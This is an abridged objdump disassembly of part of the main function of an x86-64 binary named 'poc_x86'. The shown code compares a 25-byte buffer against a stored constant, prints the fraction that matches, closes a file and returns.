
poc_x86:     file format elf64-x86-64


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .text:

00000000000011a0 <main>:
    11a0:	41 57                	push   %r15
    1330:	31 c0                	xor    %eax,%eax
    1332:	e8 59 fd ff ff       	call   1090 <printf@plt>
    1337:	b8 05 00 00 00       	mov    $0x5,%eax
    133c:	31 d2                	xor    %edx,%edx
    133e:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
    1343:	48 8d 35 96 0d 06 00 	lea    0x60d96(%rip),%rsi        # 620e0 <_IO_stdin_used+0xe0>
    134a:	8a 1c 06             	mov    (%rsi,%rax,1),%bl
    134d:	38 1c 01             	cmp    %bl,(%rcx,%rax,1)
    1350:	75 02                	jne    1354 <main+0x1b4>
    1352:	ff c2                	inc    %edx
    1354:	48 ff c0             	inc    %rax
    1357:	48 83 f8 19          	cmp    $0x19,%rax
    135b:	75 ed                	jne    134a <main+0x1aa>
    135d:	b0 01                	mov    $0x1,%al
    135f:	f3 0f 2a c2          	cvtsi2ss %edx,%xmm0
    1363:	48 8d 3d 8f 0d 06 00 	lea    0x60d8f(%rip),%rdi        # 620f9 <_IO_stdin_used+0xf9>
    136a:	f3 0f 5e 05 a2 0d 06 	divss  0x60da2(%rip),%xmm0        # 62114 <_IO_stdin_used+0x114>
    1371:	00 
    1372:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
    1376:	e8 15 fd ff ff       	call   1090 <printf@plt>
    137b:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
    1380:	e8 eb fc ff ff       	call   1070 <fclose@plt>
    1385:	48 8b 84 24 b8 38 01 	mov    0x138b8(%rsp),%rax
    138c:	00 
    138d:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax
    1394:	00 00 
    1396:	74 05                	je     139d <main+0x1fd>
    1398:	e8 e3 fc ff ff       	call   1080 <__stack_chk_fail@plt>
    139d:	48 81 c4 c8 38 01 00 	add    $0x138c8,%rsp
    13a4:	31 c0                	xor    %eax,%eax
    13a6:	5b                   	pop    %rbx
    13a7:	5d                   	pop    %rbp
    13a8:	41 5c                	pop    %r12
    13aa:	41 5d                	pop    %r13
    13ac:	41 5e                	pop    %r14
    13ae:	41 5f                	pop    %r15
    13b0:	c3                   	ret

Disassembly of section .fini:
